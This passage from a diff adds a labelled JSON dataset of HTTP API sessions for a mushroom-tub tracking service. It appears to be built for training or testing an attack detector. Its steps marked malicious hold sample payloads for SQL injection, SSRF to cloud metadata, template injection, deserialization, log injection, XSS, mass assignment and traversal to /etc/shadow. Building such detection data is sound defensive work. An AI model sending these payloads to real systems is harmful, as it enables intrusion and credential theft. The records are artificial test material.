+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SSRF Tub",
+          "strainId": "strain_01",
+          "substrateType": "http://169.254.169.254/latest/meta-data/"
+        },
+        "note": "The client queries an internal address (SSRF)."
+      },
+      {
+        "id": "sess125-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess126",
+    "client_ip": "192.168.1.200",
+    "steps": [
+      {
+        "id": "sess126-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user26@example.com",
+          "password": "password26"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess126-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token26"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess126-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token26",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "TemplateTub",
+          "strainId": "strain_01",
+          "substrateType": "${''.getClass().forName('java.lang.Runtime')}"
+        },
+        "note": "The client submits a template expression in substrateType."
+      },
+      {
+        "id": "sess126-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token26"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess127",
+    "client_ip": "10.0.5.15",
+    "steps": [
+      {
+        "id": "sess127-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user27@example.com",
+          "password": "password27"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess127-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token27"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess127-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token27",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "JavaSerialized",
+          "strainId": "strain_01",
+          "substrateType": "aced000573720011mp.SerializedClass"
+        },
+        "note": "The client sends a serialized object payload."
+      },
+      {
+        "id": "sess127-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token27"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess128",
+    "client_ip": "172.19.0.8",
+    "steps": [
+      {
+        "id": "sess128-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user28@example.com",
+          "password": "password28"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess128-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess128-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "LogStampTub\n[ERROR] 2026-03-29 Unauthorized access detected",
+          "strainId": "strain_01"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess128-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess129",
+    "client_ip": "192.168.100.1",
+    "steps": [
+      {
+        "id": "sess129-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "RoleTub",
+          "strainId": "strain_01",
+          "role": "administrator"
+        },
+        "note": "The client includes an unauthorized role field."
+      },
+      {
+        "id": "sess129-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user29@example.com",
+          "password": "password29"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess129-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess129-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess130",
+    "client_ip": "10.0.6.22",
+    "steps": [
+      {
+        "id": "sess130-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user30@example.com",
+          "password": "password30"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess130-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/users/user_unauthorized_999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess130-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess130-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess131",
+    "client_ip": "192.168.1.11",
+    "steps": [
+      {
+        "id": "sess131-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user31@example.com",
+          "password": "password31"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess131-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess131-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_31",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31"
+        },
+        "body": null,
+        "note": "User views tub details."
+      },
+      {
+        "id": "sess131-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_32",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess132",
+    "client_ip": "10.0.7.14",
+    "steps": [
+      {
+        "id": "sess132-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Penis Envy's"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains an apostrophe in strain search."
+      },
+      {
+        "id": "sess132-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_03",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess132-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user32@example.com",
+          "password": "password32"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess132-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token32"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess133",
+    "client_ip": "172.20.0.9",
+    "steps": [
+      {
+        "id": "sess133-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "test' UNION SELECT null, null-- "
+        },
+        "headers": {},
+        "body": null,
+        "note": "The client executes a query injection attack."
+      },
+      {
+        "id": "sess133-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user33@example.com",
+          "password": "password33"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess133-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token33"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess133-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token33"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess134",
+    "client_ip": "192.168.1.12",
+    "steps": [
+      {
+        "id": "sess134-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user34@example.com",
+          "password": "password34"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess134-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess134-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub One\nContinued notes text",
+          "strainId": "strain_01"
+        },
+        "note": "Request body contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess134-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess135",
+    "client_ip": "10.0.8.20",
+    "steps": [
+      {
+        "id": "sess135-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user35@example.com",
+          "password": "password35"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess135-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess135-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess135-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess136",
+    "client_ip": "172.25.0.3",
+    "steps": [
+      {
+        "id": "sess136-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user36@example.com",
+          "password": "password36"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess136-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess136-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36",
+          "Content-Type": "application/json",
+          "X-Client-Tag": "desktop-app"
+        },
+        "body": {
+          "name": "Standard Tub",
+          "strainId": "strain_01"
+        },
+        "note": "Request includes a harmless extra custom header."
+      },
+      {
+        "id": "sess136-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess137",
+    "client_ip": "192.168.1.13",
+    "steps": [
+      {
+        "id": "sess137-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token37",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<iframe src=javascript:alert(1)>",
+          "strainId": "strain_01"
+        },
+        "note": "The client submits browser-executed code via iframe."
+      },
+      {
+        "id": "sess137-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user37@example.com",
+          "password": "password37"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess137-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token37"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess137-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token37"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess138",
+    "client_ip": "10.0.9.11",
+    "steps": [
+      {
+        "id": "sess138-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user38@example.com",
+          "password": "password38"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess138-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess138-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_38",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38",
+          "User-Agent": "Mozilla/5.0 (Windows NT 4.0; WOW64)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent string."
+      },
+      {
+        "id": "sess138-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess139",
+    "client_ip": "172.28.0.10",
+    "steps": [
+      {
+        "id": "sess139-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user39@example.com",
+          "password": "password39"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess139-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess139-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SSRF Tub 2",
+          "strainId": "strain_01",
+          "substrateType": "http://10.0.0.1/admin"
+        },
+        "note": "The client references an internal address."
+      },
+      {
+        "id": "sess139-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess140",
+    "client_ip": "192.168.1.14",
+    "steps": [
+      {
+        "id": "sess140-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Info": "Mentioning firewall rule configuration in passing."
+        },
+        "body": null,
+        "note": "Request mentions a technical word in header."
+      },
+      {
+        "id": "sess140-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_02",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess140-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user40@example.com",
+          "password": "password40"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess140-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token40"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess141",
+    "client_ip": "10.0.10.5",
+    "steps": [
+      {
+        "id": "sess141-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user41@example.com",
+          "password": "password41"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess141-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token41"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess141-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token41",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "TemplateTub2",
+          "strainId": "strain_01",
+          "substrateType": "#{T(java.lang.System).getenv()}"
+        },
+        "note": "The client submits a template expression."
+      },
+      {
+        "id": "sess141-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token41"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess142",
+    "client_ip": "172.30.5.2",
+    "steps": [
+      {
+        "id": "sess142-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user42@example.com",
+          "password": "password42"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess142-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess142-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Serialized2",
+          "strainId": "strain_01",
+          "substrateType": "rO0ABXNyACFqYXZhLmxhbmcuVHJhbnNsYXRpb25TZXJpYWxpemVk"
+        },
+        "note": "The client sends a serialized object payload."
+      },
+      {
+        "id": "sess142-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess143",
+    "client_ip": "192.168.1.15",
+    "steps": [
+      {
+        "id": "sess143-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user43@example.com",
+          "password": "password43"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess143-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess143-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "LogTub2\n[INFO] 2026-03-29 Root shell accessed",
+          "strainId": "strain_01"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess143-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess144",
+    "client_ip": "10.0.11.8",
+    "steps": [
+      {
+        "id": "sess144-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token44",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "PrivilegeTub2",
+          "strainId": "strain_01",
+          "permissionLevel": "super_admin"
+        },
+        "note": "The client includes a privilege field not in the contract."
+      },
+      {
+        "id": "sess144-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user44@example.com",
+          "password": "password44"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess144-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token44"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess144-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token44"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess145",
+    "client_ip": "172.16.10.4",
+    "steps": [
+      {
+        "id": "sess145-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user45@example.com",
+          "password": "password45"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess145-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_nonexistent_888",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess145-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess145-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess146",
+    "client_ip": "192.168.1.16",
+    "steps": [
+      {
+        "id": "sess146-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user46@example.com",
+          "password": "password46"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess146-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token46"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess146-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/settings",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token46"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess146-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token46"
+        },
+        "body": null,
+        "note": "User views profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess147",
+    "client_ip": "10.0.12.30",
+    "steps": [
+      {
+        "id": "sess147-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user47@example.com",
+          "password": "password47"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess147-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess147-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_47",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "User gets tub details."
+      },
+      {
+        "id": "sess147-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_47/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "User lists tub logs."
+      },
+      {
+        "id": "sess147-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_48",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess148",
+    "client_ip": "172.22.0.15",
+    "steps": [
+      {
+        "id": "sess148-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Mazatapec's"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains an apostrophe."
+      },
+      {
+        "id": "sess148-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_04",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess148-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user48@example.com",
+          "password": "password48"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess148-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token48"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess149",
+    "client_ip": "192.168.1.17",
+    "steps": [
+      {
+        "id": "sess149-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user49@example.com",
+          "password": "password49"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess149-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "admin' UNION SELECT password, email FROM users--"
+        },
+        "headers": {},
+        "body": null,
+        "note": "The client performs query injection in search."
+      },
+      {
+        "id": "sess149-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token49"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess149-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token49"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess150",
+    "client_ip": "10.0.13.4",
+    "steps": [
+      {
+        "id": "sess150-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user50@example.com",
+          "password": "password50"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess150-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess150-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub Three\nNotes continue on next line",
+          "strainId": "strain_01"
+        },
+        "note": "Request body contains a newline that continues a sentence."
+      },
+      {
